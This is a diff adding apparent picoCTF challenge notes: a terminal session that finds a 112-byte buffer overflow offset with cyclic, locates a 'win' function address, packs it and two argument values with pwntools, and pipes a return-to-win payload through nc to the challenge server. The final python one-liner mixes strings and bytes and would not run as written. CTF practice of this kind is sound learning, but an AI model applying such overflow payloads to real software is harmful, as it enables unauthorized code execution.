@@ -1,0 +1,30 @@
+linux@linux:~/Desktop/CTF$ cyclic 140 | ./vuln
+
+Please enter your string:
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaab
+Segmentation fault (core dumped)
+
+linux@linux:~/Desktop/CTF$ dmesg | grep vuln
+[11704.593860] vuln[102737]: segfault at 62616164 ip 0000000062616164 sp 00000000ffa4ae10 error 14 in libc-2.31.so[f7d28000+19000]
+linux@linux:~/Desktop/CTF$ sudo cyclic -l 0x62616164
+112
+
+
+
+sudo objdump -t vuln | grep win
+08049296
+
+
+python3
+>>> from pwn import *
+p32(0x08049296)
+b'\x96\x92\x04\x08'
+
+p32(0xCAFEF00D)
+b'\r\xf0\xfe\xca'
+
+p32(0xF00DF00D)
+b'\r\xf0\r\xf0'
+
+
+python -c "print('A'*112 + b'\x96\x92\x04\x08')+'AAAA'+b'\r\xf0\xfe\xca'+b'\r\xf0\r\xf0'" | nc saturn.picoctf.net 50091
